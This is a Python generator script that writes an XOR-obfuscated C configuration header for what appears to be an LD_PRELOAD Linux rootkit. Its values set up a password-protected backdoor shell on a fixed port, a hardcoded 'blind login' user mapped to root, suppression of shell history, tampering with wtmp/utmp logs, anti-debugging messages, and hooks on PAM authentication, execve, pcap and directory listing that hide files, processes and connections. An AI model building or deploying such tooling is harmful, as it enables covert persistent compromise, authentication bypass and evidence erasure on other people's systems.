#!/usr/bin/env python3


def xor(x_str):
    result = []

    for x in x_str:
        xor_char = ord(x) ^ 0xfe
        hex_char = hex(xor_char)[2:]  # remove prefix 0x
        result.append(f'\\x{hex_char}')

    return ''.join(result)


header_template = '''#define _GNU_SOURCE
#pragma once
//#define DEBUG_APP
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define MAGIC_STRING\t"{magic_string}"
#define CONFIG_FILE\t"{config_file}"
#define BIN_FILE\t"{bin_file}"
#define WTMP_FILE_X\t"{wtmp_file}"
#define UTMP_FILE_X\t"{utmp_file}"
#define SYS_WRITE\t"{sys_write}"
#define SYS_READ\t"{sys_read}"
#define PROC_PATH\t"{proc_path}"
#define ANTI_DEBUG_MSG\t"{anti_debug_msg}"

#define LD_TRACE\t"{ld_trace}"
#define LD_NORMAL\t"{ld_normal}"
#define LD_HIDE\t"{ld_hide}"
#define HASHDB_BINAVOID_PATH\t"{hashdb_binavoid_path}"
#define HASHDB_BINBLOCK_PATH\t"{hashdb_binblock_path}"
#define BINBLOCK_MSG\t"{binblock_msg}"

#define PROC_NET_TCP\t"{proc_net_tcp}"
#define PROC_NET_TCP6\t"{proc_net_tcp6}"
#define SCANF_LINE\t"{scanf_line}"

#define SHELL_TYPE\t"{shell_type}"
#define SHELL_MSG\t"{shell_msg}"
#define SHELL_PASSWD\t"{shell_passwd}"
#define SHELL_SERVER\t"{shell_server}"
#define HIDE_TERM_VAR\t"{hide_term_var}"
#define HIDE_TERM_STR\t"{hide_term_str}"
#define HIST_FILE\t"{hist_file}"
#define TERM\t"{term}"
#define CMD_PROC_NAME\t"{cmd_proc_name}"

#define BLIND_LOGIN\t"{blind_login}"
#define C_ROOT\t"{c_root}"

#define MAX_LEN 1024

#define SHELL_SERVER_PORT\t{shell_server_port}
#define SRC_LOW_PORT\t{src_low_port}
#define SRC_HIGH_PORT\t{src_high_port}

#define O_RDWR 02
#define O_RDONLY 00

#define SYS_ACCESS 0
#define SYS_READDIR 1
#define SYS_FOPEN 2
#define SYS_OPENDIR 3
#define SYS_OPEN 4
#define SYS_RMDIR 5
#define SYS_LINK 6
#define SYS_UNLINK 7
#define SYS_UNLINKAT 8
#define SYS_RENAME 9
#define SYS_MKDIR 10
#define SYS_MKDIRAT 11
#define SYS_XSTAT 12
#define SYS_LXSTAT 13
#define SYS_PCAP_LOOP 14
#define SYS_EXECVE 15
#define SYS_PAM_AUTHENTICATE 16
#define SYS_PAM_OPEN_SESSION 17
#define SYS_GETPWNAM 18
#define SYS_GETPWNAM_R 19
#define SYS_PAM_ACCT_MGMT 20

#define SYSCALL_SIZE 21

static char *syscall_table[SYSCALL_SIZE] = {{
'''

syscalls = [
    "access",
    "readdir",
    "fopen",
    "opendir",
    "open",
    "rmdir",
    "link",
    "unlink",
    "unlinkat",
    "rename",
    "mkdir",
    "mkdirat",
    "stat",
    "lstat",
    "pcap_loop",
    "execve",
    "pam_authenticate",
    "pam_open_session",
    "getpwnam",
    "getpwnam_r",
    "pam_acct_mgmt"
]

header = header_template.format(
    magic_string="__",
    config_file=xor("ld.so.preload"),
    bin_file=xor("libshserver"),
    wtmp_file=xor("/var/log/wtmp"),
    utmp_file=xor("/var/run/utmp"),
    shell_type=xor("/bin/sh"),
    hide_term_var=xor("HIDE_THIS_SHELL=foobar"),
    hide_term_str=xor("HIDE_THIS_SHELL"),
    hist_file=xor("HISTFILE=/dev/null"),
    term=xor("TERM=xterm"),
    sys_write=xor("write"),
    sys_read=xor("read"),
    shell_msg=xor("Welcome to the shell!\n"),
    shell_passwd=xor("hahaha"),
    shell_server=xor("shellserver"),
    shell_server_port=44929,
    src_low_port=47001,
    src_high_port=52001,
    cmd_proc_name=xor("/proc/%d/status"),
    proc_path=xor("/proc/"),
    anti_debug_msg=xor("Don't scratch the walls!"),
    binblock_msg=xor("There was a failure while copying data from/to userspace, probably caused by an invalid pointer reference."),
    proc_net_tcp=xor("/proc/net/tcp"),
    proc_net_tcp6=xor("/proc/net/tcp6"),
    scanf_line=xor("%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n"),
    ld_trace=xor("LD_TRACE_LOADED_OBJECTS"),
    ld_normal=xor("/etc/ld.so.preload"),
    ld_hide=xor("/etc/kernelshserver"),
    blind_login=xor("rick"),
    c_root=xor("root"),
    hashdb_binavoid_path=xor("/etc/__tmphashtable"),
    hashdb_binblock_path=xor("/etc/__tmp2hashtable")
)

# XOR the syscall names and format them into a list
syscall_list = ', '.join(f'"{xor(call)}"' for call in syscalls)

# Print the final output
print(header)
print(syscall_list + '};')

